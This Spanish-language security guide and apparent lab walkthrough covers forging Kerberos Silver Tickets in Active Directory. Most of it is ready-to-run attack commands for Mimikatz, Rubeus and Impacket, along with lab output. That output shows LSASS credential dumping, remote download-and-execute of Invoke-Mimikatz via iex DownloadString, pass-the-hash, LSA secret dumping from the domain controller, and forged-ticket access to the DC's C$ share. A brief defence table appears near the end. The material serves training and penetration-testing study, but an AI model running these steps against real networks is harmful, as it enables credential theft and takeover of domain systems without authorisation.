
# Silver Ticket

## <mark style="color:$primary;">¿Qué es un Silver Ticket?</mark>

Un **Silver Ticket** es un **ticket de servicio (TGS)** falsificado que permite acceder a un **servicio específico** en un equipo concreto del dominio.

Imagina que tienes una llave maestra que solo abre un armario específico (Silver Ticket), en lugar de la llave que abre todas las puertas del edificio (Golden Ticket).

***

#### 🎯 ¿En qué se diferencia del Golden Ticket?

{% hint style="success" %}
**Ventaja del Silver Ticket**: No toca el Domain Controller, por lo que es **mucho más sigiloso**.
{% endhint %}

<table data-header-hidden><thead><tr><th width="198.3333740234375"></th><th></th><th></th></tr></thead><tbody><tr><td>Característica</td><td>Silver Ticket</td><td>Golden Ticket</td></tr><tr><td><strong>Alcance</strong></td><td>Servicio específico en un equipo concreto</td><td>Todo el dominio</td></tr><tr><td><strong>Ticket falsificado</strong></td><td>TGS (Ticket Granting Service)</td><td>TGT (Ticket Granting Ticket)</td></tr><tr><td><strong>Hash necesario</strong></td><td>Hash del <strong>servicio objetivo</strong></td><td>Hash de <strong>krbtgt</strong></td></tr><tr><td><strong>Interacción con KDC</strong></td><td>❌ No requiere (autónomo)</td><td>✅ Sí requiere al pedir TGS</td></tr><tr><td><strong>Detección</strong></td><td>Más difícil (no contacta al DC)</td><td>Más fácil (logs del DC)</td></tr><tr><td><strong>Lo que obtienes</strong></td><td>Acceso a un servicio (CIFS, MSSQL, etc.)</td><td>Control total del dominio</td></tr></tbody></table>

***

#### 🛠️ ¿Qué necesitas para crear un Silver Ticket?

<table data-header-hidden><thead><tr><th width="306.66668701171875"></th><th></th></tr></thead><tbody><tr><td>Requisito</td><td>Cómo obtenerlo</td></tr><tr><td><strong>NTLM hash del servicio objetivo</strong></td><td>Kerberoasting, dumping LSASS, DCSync</td></tr><tr><td><strong>SID del dominio</strong></td><td><code>whoami /user</code>, PowerView, impacket</td></tr><tr><td><strong>Nombre del dominio</strong></td><td>Conocimiento básico del entorno</td></tr><tr><td><strong>SPN del servicio objetivo</strong></td><td><code>cifs/SERVER.domain</code>, <code>http/SERVER.domain</code>, etc.</td></tr></tbody></table>

#### Servicios comunes y su utilidad:

<table data-header-hidden><thead><tr><th width="190.66668701171875"></th><th></th></tr></thead><tbody><tr><td>Servicio (SPN)</td><td>Lo que permite</td></tr><tr><td><strong>CIFS</strong></td><td>Acceso a archivos compartidos (C$, ADMIN$)</td></tr><tr><td><strong>HOST</strong></td><td>Tareas programadas, WMI, servicios</td></tr><tr><td><strong>HTTP</strong></td><td>WinRM, PowerShell Remoting, IIS</td></tr><tr><td><strong>MSSQLSvc</strong></td><td>Acceso a SQL Server</td></tr><tr><td><strong>RPCSS</strong></td><td>COM/DCOM remoto</td></tr><tr><td><strong>LDAP</strong></td><td>Consultas al directorio</td></tr><tr><td><strong>WSMAN</strong></td><td>WinRM</td></tr></tbody></table>

***

## <mark style="color:$primary;">Cheatsheet</mark>

### 🪟 Windows (Mimikatz)

#### **Paso 1: Obtener el SID del dominio**

```bash
whoami /user
# Ejemplo: DOMINIO\usuario S-1-5-21-1693200156-3137632808-1858025440-1115
# El SID del dominio es: S-1-5-21-1693200156-3137632808-1858025440
```

#### **Paso 2: Crear el Silver Ticket**

```bash
# Con hash NTLM (RC4)
mimikatz.exe "kerberos::golden /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /rc4:3c8cbfa6a2c6f0a5f9e2d8c4a1b7e5f3 /user:Administrador /service:cifs /target:prod.research.SECURITY.local /ptt"

# Con clave AES256 (más sigiloso)
mimikatz.exe "kerberos::golden /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:Administrador /service:cifs /target:prod.research.SECURITY.local /ptt"
```

{% hint style="warning" %}
**NOTA CRÍTICA**: Se usa el comando `kerberos::golden` tanto para Golden como para Silver Tickets. La diferencia está en los parámetros: `service` y `target` (Silver) vs solo `krbtgt` (Golden).
{% endhint %}

#### **Paso 3: Verificar e inyectar**

```bash
# Ver tickets en memoria
klist

# Si no usaste /ptt, inyectar después
mimikatz.exe "kerberos::ptt ticket.kirbi"
```

#### **Paso 4: Usar el ticket**

```powershell
# Acceder al C$ del servidor objetivo
dir \\prod.research.SECURITY.local\c$

# O ejecutar comandos remotamente
PsExec.exe -accepteula \\prod.research.SECURITY.local cmd
```

### 🪟 Windows (Rubeus)

```powershell
# Silver Ticket con Rubeus
Rubeus.exe silver /user:Administrador /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /target:prod.research.SECURITY.local /service:cifs /rc4:3c8cbfa6a2c6f0a5f9e2d8c4a1b7e5f3 /ptt
```

Para obtener tickets para **múltiples servicios** al mismo tiempo:

```powershell
Rubeus.exe silver /user:Administrador /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /target:prod.research.SECURITY.local /rc4:3c8cbfa6a2c6f0a5f9e2d8c4a1b7e5f3 /altservice:cifs,http,host,winrm /ptt
```

### 🐉 Kali Linux (Impacket)

#### **Paso 1: Obtener el SID del dominio**

```bash
# Con lookupsid.py
impacket-lookupsid anonymous@prod.research.SECURITY.local -no-pass

# O con secretsdump
impacket-secretsdump research.SECURITY.local/student:password@prod.research.SECURITY.local -just-dc-user krbtgt | grep SID
```

#### **Paso 2: Crear el Silver Ticket**

```bash
# Con ticketer.py (hash RC4)
impacket-ticketer -nthash 3c8cbfa6a2c6f0a5f9e2d8c4a1b7e5f3 -domain-sid S-1-5-21-1693200156-3137632808-1858025440 -domain research.SECURITY.local -spn cifs/prod.research.SECURITY.local -user-id 500 Administrador

# Con clave AES256
impacket-ticketer -aes-key b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 -domain-sid S-1-5-21-1693200156-3137632808-1858025440 -domain research.SECURITY.local -spn cifs/prod.research.SECURITY.local -user-id 500 Administrador

# Para múltiples servicios
impacket-ticketer -nthash 3c8cbfa6a2c6f0a5f9e2d8c4a1b7e5f3 -domain-sid S-1-5-21-1693200156-3137632808-1858025440 -domain research.SECURITY.local -spn cifs/prod.research.SECURITY.local -spn http/prod.research.SECURITY.local -user-id 500 Administrador
```

#### **Paso 3: Usar el ticket generado**

```bash
# El comando anterior genera un archivo .ccache
export KRB5CCNAME=$(pwd)/Administrador.ccache

# Ver el ticket
impacket-klist -k Administrador.ccache

# Usar el ticket (-k y -no-pass)
impacket-psexec -k -no-pass -dc-ip 192.168.1.10 research.SECURITY.local/Administrador@prod.research.SECURITY.local

# Acceso a C$
smbclient //prod.research.SECURITY.local/C$ -k -no-pass
```

***

## <mark style="color:$primary;">Ejemplo práctico</mark>

Basado en el lab anterior, supongamos que tenemos el **hash de la cuenta `SECLOGS$`** (equipo `seclogs`):

#### Desde Windows (en `seclogs` con Mimikatz)

```powershell
# 1. Obtener SID del dominio
whoami /user
# S-1-5-21-1693200156-3137632808-1858025440-1115
# SID dominio: S-1-5-21-1693200156-3137632808-1858025440

# 2. Crear Silver Ticket para CIFS contra PROD
mimikatz.exe "kerberos::golden /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /rc4:HASH_DE_SECLOGS$ /user:Administrador /service:cifs /target:prod.research.SECURITY.local /ptt"

# 3. Acceder al DC
dir \\prod.research.SECURITY.local\c$
```

#### Desde Kali Linux

```bash
# 1. Crear ticket con ticketer
impacket-ticketer -nthash HASH_SECLOGS -domain-sid S-1-5-21-1693200156-3137632808-1858025440 -domain research.SECURITY.local -spn cifs/prod.research.SECURITY.local Administrador

# 2. Usar el ticket
export KRB5CCNAME=Administrador.ccache
impacket-psexec -k -no-pass -dc-ip 10.0.0.10 research.SECURITY.local/Administrador@prod.research.SECURITY.local
```

***

## <mark style="color:$primary;">Flujo completo de ataque</mark>

```
Paso 1: Obtener hash de un servicio/cuenta de equipo
        ↓
   LSASS dumping, Kerberoasting, DCSync
        ↓
Paso 2: Obtener SID del dominio
        ↓
   whoami /user, lookupsid.py
        ↓
Paso 3: Crear Silver Ticket con el hash
        ↓
   Mimikatz, Rubeus o ticketer.py
        ↓
Paso 4: Inyectar ticket en memoria
        ↓
   /ptt con Mimikatz, Rubeus ptt, o export KRB5CCNAME
        ↓
Paso 5: Acceder al servicio objetivo
        ↓
   dir \\target\c$, PsExec, WinRM, etc.
        ↓
Paso 6: Repetir para otros servicios/equipos
```

***

#### ⚠️ Limitaciones importantes (post-November 2021)

Desde las actualizaciones de Microsoft de noviembre de 2021, el **usuario que especifiques en el ticket debe existir realmente en el dominio** (ya no se puede usar un usuario inexistente).

```bash
# Ya no funciona (usuario inexistente)
mimikatz.exe "kerberos::golden /user:UsuarioFalso /..."

# Debes usar un usuario real (Administrador, etc.)
mimikatz.exe "kerberos::golden /user:Administrador /..."
```

***

## <mark style="color:$primary;">¿Cómo protegerte?</mark>

| Medida                                                           | Descripción                                |
| ---------------------------------------------------------------- | ------------------------------------------ |
| **Contraseñas largas y complejas** para cuentas de servicio      | Dificulta cracking de hashes               |
| **Rotación periódica** de contraseñas de servicio (cada 30 días) | Los hashes robados caducan                 |
| **Usar gMSA (Group Managed Service Accounts)**                   | Microsoft rota contraseñas automáticamente |
| **Monitorear eventos de inicio de sesión de servicios**          | ID 4624, 4769                              |
| **Auditar creación de tickets de servicio**                      | Kerberos Service Ticket Operations         |
| **Limpiar memoria LSASS con Credential Guard**                   | Protege hashes en memoria                  |

***

## <mark style="color:$primary;">Resumen final</mark>

| Ataque              | Hash necesario        | Ticket          | Alcance             | ¿Contacta al DC? |
| ------------------- | --------------------- | --------------- | ------------------- | ---------------- |
| **AS-REP Roasting** | N/A (hash crackeable) | AS-REP          | Usuario específico  | Sí               |
| **Kerberoasting**   | N/A (hash crackeable) | TGS             | Servicio específico | Sí               |
| **Pass-the-Ticket** | N/A (ticket robado)   | TGT o TGS       | Variable            | No               |
| **Silver Ticket**   | Servicio objetivo     | TGS falsificado | Servicio específico | No               |
| **Golden Ticket**   | krbtgt                | TGT falsificado | Dominio completo    | Sí (al usar)     |

***

### 📌 Notas importantes

1. **Silver Ticket es más sigiloso que Golden Ticket** porque no contacta al KDC
2. El comando en Mimikatz se llama `kerberos::golden` para ambos tipos
3. La diferencia está en los parámetros: `service` y `target` son obligatorios para Silver
4. El usuario debe existir en AD desde Noviembre 2021
5. Puedes crear Silver Tickets para **múltiples servicios** a la vez con `/altservice`

***

## <mark style="color:$primary;">Lab: Silver Ticket</mark>

En este entorno de laboratorio, tendrá acceso a la interfaz gráfica de usuario (GUI) de una máquina Windows (2012). Esta máquina actuará como su máquina atacante. Su tarea en este laboratorio consiste en generar un ticket Silver dirigido al servicio CIFS del controlador de dominio.

**Objetivo:** Realizar un ataque de tipo Silver Ticket dirigido al servicio CIFS en el controlador de dominio.

**Nota:** Todas las herramientas se encuentran en el directorio **C:\Tools** .

### Enumerar Domain Controller

El DC es: `prod.research.SECURITY.local`

```powershell
PS C:\tools> powershell -ep bypass
PS C:\tools> . .\PowerView.ps1
PS C:\tools> Get-Domain

Forest                  : SECURITY.local
DomainControllers       : {prod.research.SECURITY.local}
Children                : {}
DomainMode              : Windows2012R2Domain
DomainModeLevel         : 6
Parent                  : SECURITY.local
PdcRoleOwner            : prod.research.SECURITY.local
RidRoleOwner            : prod.research.SECURITY.local
InfrastructureRoleOwner : prod.research.SECURITY.local
Name                    : research.SECURITY.local
```

### Obtener Domain SID

```powershell
PS C:\tools> Get-DomainSID
S-1-5-21-1693200156-3137632808-1858025440
```

### Encontrar Local Admins

```powershell
PS C:\tools> Find-LocalAdminAccess
seclogs.research.SECURITY.local
```

### Impersonación

```powershell
PS C:\tools> Enter-PSSession seclogs.research.SECURITY.local
[seclogs.research.SECURITY.local]: PS C:\Users\student\Documents>
```

### Enviar tools (HFS Server)

Usaremos HFS Server para importar las herramientas a la sesión de Powershell de seclogs que hemos impersonado, ya que nos genera una URL para descargar las tools:

<figure><img src="/files/HLNahaPinA2k8FoDolRu" alt=""><figcaption></figcaption></figure>

#### Importar Tools

{% hint style="info" %}
**Nota**: Importar `Invoke-Mimikatz` para ejecutar Mimikatz desde Powershell
{% endhint %}

```powershell
[seclogs.research.SECURITY.local]: PS C:\> iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-Mimikatz.ps1')
[seclogs.research.SECURITY.local]: PS C:\> iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-TokenManipulation.ps1')
```

### Token Manipulation

Observamos que el usuario administrator tiene el `LogonType` en `2`, lo que significa que está logueado en el equipo:

```powershell
[seclogs.research.SECURITY.local]: PS C:\> Invoke-TokenManipulation -Enumerate

Domain              : RESEARCH
Username            : administrator
hToken              : 3048
LogonType           : 2
IsElevated          : True
TokenType           : Primary
SessionID           : 1
PrivilegesEnabled   : {SeChangeNotifyPrivilege, SeImpersonatePrivilege, SeCreateGlobalPrivilege}
PrivilegesAvailable : {SeIncreaseQuotaPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege,
                      SeLoadDriverPrivilege...}
ProcessId           : 2288
<----SNIP---->
```

### Mimikatz: Logonpasswords

No conseguimos la contraseña en plano de administrator, pero conseguimos su hash:

```powershell
[seclogs.research.SECURITY.local]: PS C:\> Invoke-Mimikatz -Command '"privilege::debug", "token::elevate", "sekurlsa::logonpasswords"'

Hostname: seclogs.research.SECURITY.local / S-1-5-21-1693200156-3137632808-1858025440

  .#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # privilege::debug
Privilege '20' OK

<----SNIP---->

Authentication Id : 0 ; 244241 (00000000:0003ba11)
Session           : Interactive from 1
User Name         : administrator
Domain            : RESEARCH
Logon Server      : PROD
Logon Time        : 4/29/2026 8:54:05 AM
SID               : S-1-5-21-1693200156-3137632808-1858025440-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : RESEARCH
         * NTLM     : 84398159ce4d01cfe10cf34d5dae3909
         * SHA1     : ccc47c4f9541f99b020d38b8f7ea10f7b4b8595c
         [00010000] CredentialKeys
         * NTLM     : 84398159ce4d01cfe10cf34d5dae3909
         * SHA1     : ccc47c4f9541f99b020d38b8f7ea10f7b4b8595c
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : RESEARCH
         * Password : (null)
        kerberos :
         * Username : administrator
         * Domain   : RESEARCH.SECURITY.LOCAL
         * Password : (null)
<----SNIP---->
```

### Pass the Hash

Desde una nueva Powershell como admin:

```powershell
PS C:\Windows\system32> cd c:/Tools
PS C:\Tools> powershell -ep bypass
PS C:\Tools> . .\Invoke-Mimikatz.ps1
PS C:\Tools> Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:84398159ce4d01cfe10cf34d5dae3909 /run:powershell.exe"'
```

Eso nos abre una nueva terminal como Administrator, desde la que volcaremos más hashes utilizando el hash de administrator.

### Hash Dump como admin

```powershell
PS C:\Windows\system32> cd c:/Tools
PS C:\Tools> powershell -ep bypass

PS C:\Tools> . .\Invoke-Mimikatz.ps1
PS C:\Tools> Invoke-Mimikatz -Command '"lsadump::lsa /inject"' -Computername prod.research.SECURITY.local

Hostname: client.research.SECURITY.local / S-1-5-21-1693200156-3137632808-1858025440

  .#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # lsadump::lsa /inject
Domain : RESEARCH / S-1-5-21-1693200156-3137632808-1858025440

<----SNIP---->
User : PROD$

 * Primary
    NTLM : b0653acf1c1521ef3f4fd68e7e4911fc
    LM   :
  Hash NTLM: b0653acf1c1521ef3f4fd68e7e4911fc
    ntlm- 0: b0653acf1c1521ef3f4fd68e7e4911fc
    ntlm- 1: 0b53e62a531ca5a999d7e6e39e2e3dc1
    ntlm- 2: 9c84a177cba6748234e655f91380f7c1
    ntlm- 3: 3f25b795db1bf05a47f16affcabc5750
    lm  - 0: 99c859ce642bd67aeafd865d76e7f5ba
    lm  - 1: 76afda0870706a53f553e79f0b5d4065
    lm  - 2: 2d0f3c401c8a2a1991a8f00fbc6d1bed
    lm  - 3: 093c5d80193269c34f45bb8e3001fc79
<----SNIP---->
```

Nos interesa el hash NTLM del usuario PROD$: `b0653acf1c1521ef3f4fd68e7e4911fc`

Usaremos este hash para crear el Silver Ticket.

### Silver Ticket con Mimikatz

En una nueva Powershell debemos especificar a Mimikatz:

* Domain
* Domain SID
* Target (DC)
* Servicio (CIFS)
* Hash (RC4)
* Usuario

{% hint style="info" %}
Aunque le especificamos `kerberos::golden` en realidad es un Silver Ticket, ya que especificamos `/service:CIFS`, lo que nos permite solamente acceder al sistema de archivos
{% endhint %}

```powershell
PS C:\Users\student> cd C:\Tools
PS C:\Tools> powershell -ep bypass
PS C:\Tools> . .\Invoke-Mimikatz.ps1
PS C:\Tools> Invoke-Mimikatz -Command '"kerberos::golden /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /target:prod.research.SECURITY.local /service:CIFS /rc4:b0653acf1c1521ef3f4fd68e7e4911fc /user:administrator /ptt"'

Hostname: client.research.SECURITY.local / S-1-5-21-1693200156-3137632808-1858025440

  .#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # kerberos::golden /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /
target:prod.research.SECURITY.local /service:CIFS /rc4:b0653acf1c1521ef3f4fd68e7e4911fc /user:administrator /ptt
User      : administrator
Domain    : research.SECURITY.local (RESEARCH)
SID       : S-1-5-21-1693200156-3137632808-1858025440
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: b0653acf1c1521ef3f4fd68e7e4911fc - rc4_hmac_nt
Service   : CIFS
Target    : prod.research.SECURITY.local
Lifetime  : 4/29/2026 9:39:36 AM ; 4/26/2036 9:39:36 AM ; 4/26/2036 9:39:36 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'administrator @ research.SECURITY.local' successfully submitted for current session
```

### Comprobación

Observamos que este Silver Ticket no tiene fecha de caducidad:

```powershell
PS C:\Tools> klist

Current LogonId is 0:0x3fff1

Cached Tickets: (1)

#0>     Client: administrator @ research.SECURITY.local
        Server: CIFS/prod.research.SECURITY.local @ research.SECURITY.local
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 4/29/2026 9:39:36 (local)
        End Time:   4/26/2036 9:39:36 (local)
        Renew Time: 4/26/2036 9:39:36 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

### Acceso al Domain Controller

```powershell
PS C:\Tools> cd \\prod.research.security.local\c$
PS Microsoft.PowerShell.Core\FileSystem::\\prod.research.security.local\c$> ls

    Directory: \\prod.research.security.local\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        8/22/2013   3:52 PM                PerfLogs
d-r---        10/1/2021   4:25 PM                Program Files
d-----        9/21/2021  12:28 PM                Program Files (x86)
d-r---        9/27/2021   9:00 AM                Users
d-----        9/27/2021   9:19 AM                Windows
```
